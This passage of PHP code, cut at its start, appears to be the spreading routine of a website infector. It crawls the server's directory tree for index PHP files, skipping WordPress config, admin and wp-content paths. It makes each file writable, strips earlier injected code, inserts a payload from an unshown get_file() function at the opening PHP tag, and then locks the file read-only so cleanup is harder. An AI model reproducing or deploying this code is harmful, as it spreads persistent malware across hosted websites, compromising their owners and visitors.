	$delims = '\\';
} else {
	$patharr = explode('/',$path);
	$delims = '/';
}
$needfil = array('index.p');
$firdttag = $patharr[0];
if(strlen($firdttag) == 0) {
	$firdttag = $delims.$patharr[1];
	$patharr = array_shift($patharr);
}
$patharr = array_shift($patharr);
foreach ($patharr as $key => $value){
	if($key == 0){
		$patharr[$key] = $firdttag.$delims.$value.$delims;
	} else {
		$patharr[$key] = $firdttag.$value.$delims;
	}
	$firdttag = $patharr[$key];
	$files=array();
	$result[]=$firdttag;
	if(count($patharr)-1 != $key){
		$files=scandir($patharr[$key]);
		foreach ($files as $values){
			if (!in_array($values,array(".",".."))){
				if (is_dir($patharr[$key].$values)){
					$result[]=$patharr[$key].$values;
					$filest=scandir($patharr[$key].$values.$delims);
					foreach ($filest as $valuest){
						if (!in_array($valuest,array(".",".."))){
							if (is_dir($patharr[$key].$values.$delims.$valuest)){
								$result[]=$patharr[$key].$values.$delims.$valuest;
							}
						}
					}
				}
			}
		}
	}
}
$patharr = array();
$fullpatharr = array();
foreach ($result as $key => $value){
	$files=array();
	$files=scandir($value);
	foreach ($files as $values){
		foreach ($needfil as $needf){
			if(strpos($values,$needf) !== false && strpos($values,'wp-config.p') === false && strpos($value,'admin') === false && strpos($value,'wp-content') === false){
				$fullpatharr[] = str_replace('//','/',$value.$delims);
				$patharr[] = str_replace('//','/',$value.$delims.$values);
			}
		}
	}
}
$fullpatharr = array_unique($fullpatharr);
$patharr = array_unique($patharr);
$result = array();
$files = array();
foreach($patharr as $val){
	if(strpos($val,'.phtml') === false && strpos($val,basename(__FILE__, '.php')) === false ){
		$file = get_file();
		chmod($val,0775);
		$res=file_get_contents($val);
		$gd = false;
		if(strpos($res,'Location: install/index.php') === false){
			if(strpos($res,'exit;') !== false){
				$explodefile=explode('exit;',$res);
				$explodefiles = explode('<?php',$explodefile[0]);
				$res = $explodefiles[0]."<?php\n".trim(substr(trim(array_pop($explodefile)),1));
			}
		} else {
			if(strpos($res,'exit;') !== false){
				$explodefile=explode('exit;',$res);
				if(count($explodefile) != 2 && count($explodefile) != 1){
					$datindex = array_pop($explodefile);
					$res = "<?php\n".trim(substr(trim(array_pop($explodefile).' exit; '.$datindex),1));
					file_put_contents($val,$res);
				}
			}
		}
		if(strpos($res,'<?php') !== false && $gd === false){
			$res=str_replace_first('<?php',$file,$res);
			file_put_contents($val,$res);
			$gd = true;
		}
		if(strpos($res,'<?PHP') !== false && $gd === false){
			$res=str_replace_first('<?PHP',$file,$res);
			file_put_contents($val,$res);
			$gd = true;
		}
		if(strpos($res,'<?') !== false && $gd === false){
			$res=str_replace_first('<?',$file,$res);
			file_put_contents($val,$res);
		}
		chmod($val,0444);
	}else{
		
	}
}
function str_replace_first($from,$to,$content) {
	$from = '/'.preg_quote($from,'/').'/';
	return preg_replace($from,$to,$content, 1);
}
?>
